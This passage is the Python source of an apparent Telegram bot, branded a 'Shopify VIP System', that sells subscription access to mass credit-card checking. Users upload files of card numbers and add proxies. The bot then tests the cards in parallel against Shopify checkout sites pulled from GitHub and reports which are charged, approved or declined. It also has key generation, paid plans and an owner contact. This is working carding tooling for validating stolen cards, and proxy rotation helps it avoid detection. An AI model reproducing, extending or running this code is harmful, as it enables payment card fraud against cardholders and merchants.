        t = f"⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n\n├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨\n│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬\n\n├ ⦗ ⚙️ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳\n│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴\n\n{ap} ⦗ 👤 ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵\n  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦\n  ├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺\n  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬\n  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{ap_txt}\n\n⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"
        kb = [[create_native_button("View Plans", callback_data="show_plans")], [create_native_button("Channel", url=JOIN_CHANNEL_LINK), create_native_button("Group", url=JOIN_GROUP_LINK)]]
        await styled_reply(update, t, buttons=kb, specific_gif=WELCOME_GIF)

    elif cmd == "info":
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        t = f"⦗ 👤 ⦘ 𝘗𝘳𝘰𝘧𝘪𝘭𝘦 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯\n\n├ ⦗ 🆔 ⦘ 𝘐𝘋: <code>{uid}</code>\n├ ⦗ ⚡ ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{'Active' if is_paid_plan(plan) else 'Free'}</code>\n├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯: <code>{plan.title() if plan else 'Bronze'}</code>\n╰ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{limit} 𝘊𝘊𝘴</code>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "plan":
        if not await force_join_check(update, context): return
        cp = await get_user_plan(uid)
        t = f"⦗ 💎 ⦘ 𝘝𝘐𝘗 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘗𝘭𝘢𝘯𝘴\n\n"
        for _, pi in PLANS.items():
            t += f"├ ⦗ 💎 ⦘ <code>{pi['name']}</code>\n│ ├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n│ ├ ⦗ 💳 ⦘ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n│ ╰ ⦗ 💲 ⦘ 𝘗𝘳𝘪𝘤𝘦: <code>{pi['price']}</code>\n│\n"
        t += f"╰ ⦗ 👤 ⦘ 𝘠𝘰𝘶𝘳 𝘊𝘶𝘳𝘳𝘦𝘯𝘵 𝘗𝘭𝘢𝘯 ⇾ <code>{cp.title() if cp else 'Bronze'}</code>"
        kb = [[create_native_button("Contact Owner", url="https://t.me/Dddadddyttt")], [create_native_button("Back", callback_data="back_start")]]
        await styled_reply(update, t, buttons=kb, use_gif=True)

    elif cmd == "fb":
        if not await force_join_check(update, context): return
        txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
        if not txt and not update.message.reply_to_message: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦.", use_gif=True)
        if ADMIN_ID:
            try:
                if update.message.reply_to_message:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                    if txt: await context.bot.send_message(ADMIN_ID[0], f"💬 <b>Note:</b> {txt}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode="HTML")
                else:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
                    await context.bot.send_message(ADMIN_ID[0], f"📩 <b>Feedback From:</b> <code>{uid}</code>", parse_mode="HTML")
            except: pass
        await styled_reply(update, f"⦗ ✨ ⦘ 𝘠𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘥𝘦𝘭𝘪𝘷𝘦𝘳𝘦𝘥.", use_gif=True)

    elif cmd == "addpxy":
        if not await force_join_check(update, context): return
        lines = []
        if update.message.reply_to_message:
            if update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"px_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8") as file: lines = (await file.read()).split()
                os.remove(fp)
            else:
                raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                lines = raw_rep.split()
        else:
            if len(tokens) > 1: lines = args
            else: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘩𝘦 𝘱𝘳𝘰𝘹𝘪𝘦𝘴.", use_gif=True)
        
        if not lines: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘰𝘶𝘯𝘥.", use_gif=True)
        db_p = await get_all_user_proxies(uid)
        eu = {p['proxy_url'] for p in db_p} if db_p else set()
        if len(eu) >= 100: return await styled_reply(update, f"⦗ ⚠️ ⦘ 𝘓𝘪𝘮𝘪𝘵 100/100 𝘳𝘦𝘢𝘤𝘩𝘦𝘥.", use_gif=True)
        parsed = []
        for l in lines:
            px = parse_proxy_format(l)
            if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
        if not parsed: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘈𝘭𝘭 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘢𝘳𝘦 𝘢𝘥𝘥𝘦𝘥 𝘰𝘳 𝘪𝘯𝘷𝘢𝘭𝘪𝘥.", use_gif=True)
        parsed = parsed[:100-len(eu)]
        tm = await styled_reply(update, f"⦗ ⚙️ ⦘ 𝘈𝘥𝘥𝘪𝘯𝘨...", use_gif=True)
        c = 0
        for p2 in parsed: await add_proxy_db(uid, p2); c += 1
        await styled_edit(tm, f"⦗ ✅ ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘈𝘥𝘥𝘦𝘥: <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴")

    elif cmd == "proxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘠𝘰𝘶 𝘥𝘰𝘯'𝘵 𝘩𝘢𝘷𝘦 𝘢𝘯𝘺 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘴𝘢𝘷𝘦𝘥.", use_gif=True)
        t = f"⦗ 🛡️ ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘹𝘪𝘦𝘴 ({len(proxies)}/100)\n\n"
        for i, p in enumerate(proxies[:30], 1): t += f"<code>{i}.</code> <code>{p['ip']}:{p['port']}</code>\n"
        if len(proxies) > 30: t += f"\n<i>+{len(proxies)-30} 𝘮𝘰𝘳𝘦...</i>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "rmpxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘕𝘰 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘵𝘰 𝘳𝘦𝘮𝘰𝘷𝘦.", use_gif=True)
        if not args: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘱𝘦𝘤𝘪𝘧𝘺 'all' 𝘰𝘳 𝘵𝘩𝘦 𝘕𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
        arg = args[0].lower()
        if arg == 'all':
            c = await clear_all_proxies(uid)
            return await styled_reply(update, f"⦗ ✅ ⦘ 𝘊𝘭𝘦𝘢𝘳𝘦𝘥 <code>{c}</code> 𝘗𝘳𝘰𝘹𝘪𝘦𝘴.", use_gif=True)
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies): await remove_proxy_by_index(uid, idx); await styled_reply(update, f"⦗ ✅ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘳𝘦𝘮𝘰𝘷𝘦𝘥.", use_gif=True)
            else: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘕𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
        except: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘕𝘶𝘮𝘣𝘦𝘳.", use_gif=True)

    elif cmd == "gen":
        if uid not in ADMIN_ID: return
        if len(args) < 1: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘜𝘴𝘢𝘨𝘦: /gen [𝘗𝘭𝘢𝘯] [𝘕𝘶𝘮𝘣𝘦𝘳]", use_gif=True)
        pk = args[0].lower()
        amt = int(args[1]) if len(args) > 1 else 1
        if pk not in PLANS: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘗𝘭𝘢𝘯.", use_gif=True)
        pi = PLANS[pk]
        kdb = await load_keys()
        gc = []
        for _ in range(amt):
            c = f"Shopify-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
            kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            gc.append(c)
        await save_keys(kdb)
        t = f"⦗ ✅ ⦘ 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 <code>{amt}</code> 𝘒𝘦𝘺(𝘴)!\n\n├ 𝘗𝘭𝘢𝘯: <code>{pi['name']}</code>\n├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{pi['duration_days']} 𝘋𝘢𝘺𝘴</code>\n╰ 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(pi['tier'])} 𝘊𝘊𝘴</code>\n\n"
        for c in gc: t += f"<code>{c}</code>\n"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "redeem":
        if not await force_join_check(update, context): return
        c = args[0].strip() if args else ""
        if not c: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘗𝘳𝘰𝘷𝘪𝘥𝘦 𝘠𝘰𝘶𝘳 𝘒𝘦𝘺: <code>/redeem [𝘒𝘦𝘺]</code>", use_gif=True)
        kdb = await load_keys()
        if c not in kdb: return await styled_reply(update, f"⦗ ❌ ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘒𝘦𝘺.", use_gif=True)
        ki = kdb[c]
        if ki["used"]: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘛𝘩𝘪𝘴 𝘒𝘦𝘺 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘶𝘴𝘦𝘥.", use_gif=True)
        t, d = ki["tier"], ki["days"]
        await set_user_plan(uid, t, d)
        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        kdb[c]["redeemed_at"] = rt
        await save_keys(kdb)
        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
        msg = f"⦗ 👑 ⦘ <b>𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘢𝘵𝘦𝘥!</b>\n\n├ 𝘛𝘪𝘦𝘳: <code>{t}</code>\n├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{d} 𝘋𝘢𝘺𝘴</code>\n├ 𝘔𝘢𝘴𝘴 𝘓𝘪𝘮𝘪𝘵: <code>{get_cc_limit(t, uid)} 𝘊𝘊𝘴</code>\n╰ 𝘌𝘹𝘱𝘪𝘳𝘦𝘴: <code>{ed}</code>"
        kb = [[create_native_button("🚀 Start Checking", callback_data="back_start")]]
        await styled_reply(update, msg, buttons=kb, specific_gif=ACTIVATION_GIF)

    elif cmd == "validate":
        if uid not in ADMIN_ID: return
        c = args[0].strip() if args else ""
        kdb = await load_keys()
        if not c: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘒𝘦𝘺.", use_gif=True)
        if c not in kdb: return await styled_reply(update, f"⦗ ❌ ⦘ 𝘒𝘦𝘺 𝘯𝘰𝘵 𝘧𝘰𝘶𝘯𝘥.", use_gif=True)
        ki = kdb[c]
        u, ub = ki.get("used", False), ki.get("used_by", "None")
        se, st = ('🔴', "𝘜𝘴𝘦𝘥") if u else ('🟢', "𝘈𝘤𝘵𝘪𝘷𝘦")
        m = f"⦗ 🔑 ⦘ 𝘒𝘦𝘺 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯\n\n├ 𝘒𝘦𝘺: <code>{c}</code>\n├ {se} 𝘚𝘵𝘢𝘵𝘶𝘴: <code>{st}</code>\n├ 𝘗𝘭𝘢𝘯: <code>{ki.get('tier', 'Unknown')}</code>\n├ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{ki.get('days', 0)} 𝘋𝘢𝘺𝘴</code>\n├ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥: <code>{ki.get('generated_at', 'Unknown')}</code>"
        if u: m += f"\n\n├ 𝘙𝘦𝘥𝘦𝘦𝘮𝘦𝘥 𝘉𝘺: <code>{ub}</code>\n╰ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘛𝘪𝘮𝘦: <code>{ki.get('redeemed_at', 'Not yet')}</code>"
        await styled_reply(update, m, use_gif=True)

    elif cmd == "maint":
        if uid not in ADMIN_ID: return
        a = args[0].strip().lower() if args else ""
        if a: _MAINTENANCE_MODE = (a == 'on')
        else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
        t = "𝘖𝘕" if _MAINTENANCE_MODE else "𝘖𝘍𝘍"
        await styled_reply(update, f"⦗ 💎 ⦘ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦: {t}", use_gif=True)

    elif cmd in ["users", "user"]:
        if uid not in ADMIN_ID: return
        au = [str(u) for u, p in ACTIVE_MTXT_PROCESSES.items() if not p.get("stopped")]
        t = f"⦗ 🌐 ⦘ 𝘎𝘭𝘰𝘣𝘢𝘭 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n\n├ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘊𝘩𝘦𝘤𝘬𝘦𝘳𝘴: <code>{len(au)}</code>\n├ 𝘛𝘰𝘵𝘢𝘭 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘜𝘴𝘦𝘳𝘴: <code>{len(USER_LAST_REQ)}</code>\n╰ 𝘈𝘤𝘵𝘪𝘷𝘦 𝘐𝘋𝘴: <code>{', '.join(au) if au else 'None'}</code>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "revoke":
        if uid not in ADMIN_ID: return
        if not args: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘐𝘋.", use_gif=True)
        try: tu = int(args[0].strip())
        except: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
        await set_user_plan(tu, "Free", 0)
        proc = ACTIVE_MTXT_PROCESSES.get(tu)
        if proc:
            proc["stopped"] = True
            for t in proc.get("tasks", []):
                if not t.done(): t.cancel()
        await styled_reply(update, f"⦗ 💎 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘷𝘰𝘬𝘦𝘥 𝘧𝘰𝘳 <code>{tu}</code>", use_gif=True)

# ----------------- FILE AUTO CHECKER -----------------
async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"⦗ ⏳ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨 𝘧𝘪𝘭𝘦 𝘥𝘢𝘵𝘢...", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): return await styled_edit(pm, f"⦗ 💎 ⦘ 𝘈 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘪𝘴 𝘢𝘭𝘳𝘦𝘢𝘥𝘺 𝘢𝘤𝘵𝘪𝘷𝘦!")
        doc = update.message.document
        if doc.file_size > 2 * 1024 * 1024: return await styled_edit(pm, f"⦗ 💎 ⦘ 𝘍𝘪𝘭𝘦 𝘵𝘰𝘰 𝘭𝘢𝘳𝘨𝘦! (𝘔𝘢𝘹 2𝘔𝘉)")
        if not await force_join_check(update, context): return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: return await styled_edit(pm, f"⦗ 💎 ⦘ <b>𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘢𝘥𝘥 𝘱𝘳𝘰𝘹𝘪𝘦𝘴 𝘧𝘪𝘳𝘴𝘵! 𝘜𝘴𝘦 <code>/addpxy</code></b>")
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        os.remove(fp)
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"⦗ 💎 ⦘ 𝘕𝘰 𝘷𝘢𝘭𝘪𝘥 𝘤𝘢𝘳𝘥𝘴 𝘧𝘰𝘶𝘯𝘥.")
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        kb = [
            [create_native_button("Shopify (Charge)", callback_data="gate:Shopify"), create_native_button("Braintree (Soon)", callback_data="gate:soon_Braintree")],
            [create_native_button("Stripe (Soon)", callback_data="gate:soon_Stripe"), create_native_button("PayPal (Soon)", callback_data="gate:soon_PayPal")],
            [create_native_button("Cancel", callback_data="gate:cancel")]
        ]
        await styled_edit(pm, f"⦗ ⚙️ ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺:", buttons=kb)
    except Exception as e: 
        logger.error(f"File process error: {e}")
        await styled_edit(pm, f"⚠️ Error: {e}")

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query
    uid = q.from_user.id
    gn = q.data.split(":")[1]
    if gn.startswith("soon_"): return await q.answer("⏳ Gateway is coming soon!", show_alert=True)
    await q.answer()
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(q.message, f"⦗ 💎 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘢𝘯𝘤𝘦𝘭𝘭𝘦𝘥.", buttons=None)
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await styled_edit(q.message, f"⦗ ⚡ ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gn}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, q.message, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards); chk = chg = app = ins = dec = err = 0
    st = time.time()
    sites = await get_github_sites()
    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
    http_session = await get_user_http_session(uid)
    lcd = "Waiting for CC... ⏳"
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            for _ in range(40):
                if is_stopped(): break
                await asyncio.sleep(0.1)
            if is_stopped(): break
            
            el_n = time.time() - st
            cpm = int((chk / el_n) * 60) if el_n > 0 else 0
            dt = f"⦗ ⚡ ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...\n\n├ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>\n╰ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴 ⇾ <code>{WORKERS}</code>"
            kb = [
                [create_native_button(f"{lcd}", callback_data="none")],
                [create_native_button(f"🟢 Charged: {chg}", callback_data="none"), create_native_button(f"⚡ Approved: {app}", callback_data="none")],
                [create_native_button(f"🟡 Insufficient: {ins}", callback_data="none"), create_native_button(f"🔴 Declined: {dec}", callback_data="none")],
                [create_native_button(f"📊 Total: {chk} / {tot}", callback_data="none"), create_native_button(f"⚠️ Error: {err}", callback_data="none")],
                [create_native_button(f"🚀 Speed: {cpm} CPM", callback_data="none")],
                [create_native_button("🛑 Stop Process", callback_data=f"{stop_prefix}:{uid}")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker(wid):
        await asyncio.sleep(wid * 0.05)
        nonlocal chk, chg, app, ins, dec, err, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except: break
            try:
                if is_stopped(): break
                c_st = time.time()
                res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                if is_stopped(): break 
                
                c_el = time.time() - c_st
                status = res.get('status', 'Dead')
                chk += 1
                
                status_displays = {'Charged': '🟢 Charged', 'Approved': '⚡ Approved', 'Insufficient': '🟡 Insuff', 'Site Error': '⚠️ Error', 'Dead': '🔴 Declined'}
                lcd = f"{card[:16]}... ⇾ {status_displays.get(status, '🔴 Declined')}"
                
                if status == 'Charged':
                    chg += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Approved':
                    app += 1; asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                elif status == 'Insufficient':
                    ins += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, c_el, bot))
                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                elif status == 'Site Error': err += 1
                else: dec += 1
            except: err += 1; chk += 1
            finally:
                queue.task_done()
                if not is_stopped(): await asyncio.sleep(DELAY)

    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((chk / el) * 60) if el > 0 else 0
    ft = f"⦗ {'💎 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘍𝘰𝘳𝘤𝘦 𝘚𝘵𝘰𝘱𝘱𝘦𝘥' if is_stopped() else '✨ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥'} ⦘\n\n├ 🌐 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>\n╰ ⏱ 𝘛𝘪𝘮𝘦 ⇾ <code>{h}𝘩 {m}𝘮 {s}𝘴</code>"
    fkb = [
        [create_native_button(f"🟢 Charged: {chg}", callback_data="none"), create_native_button(f"⚡ Approved: {app}", callback_data="none")],
        [create_native_button(f"🟡 Insufficient: {ins}", callback_data="none"), create_native_button(f"🔴 Declined: {dec}", callback_data="none")],
        [create_native_button(f"📊 Total: {chk} / {tot}", callback_data="none"), create_native_button(f"⚠️ Error: {err}", callback_data="none")],
        [create_native_button(f"🚀 Average Speed: {avg_cpm} CPM", callback_data="none")]
    ]
    try: await styled_edit(msg_obj, ft, buttons=fkb)
    except: pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
        kb = [[create_native_button("Owner", url="https://t.me/Dddadddyttt")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except: pass

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    puid = int(q.data.split(":")[1])
    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return await q.answer("Not yours!", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await q.answer("🛑 Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_github_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    logger.info("🔄 Protocol: Webhook Killer initiated.")
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except: pass
    try: await init_db()
    except Exception as e: logger.error(f"❌ DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    global bot_instance
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    bot_instance = app.bot
    app.add_error_handler(global_error_handler)
    
    app.add_handler(MessageHandler(filters.ALL, master_router))
    
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    
    logger.info("🔄 Starting VIP System with Flawless Command Engine...")
    
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict:
            logger.warning("⚠️ Conflict detected. Retrying...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"⚠️ Fatal error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
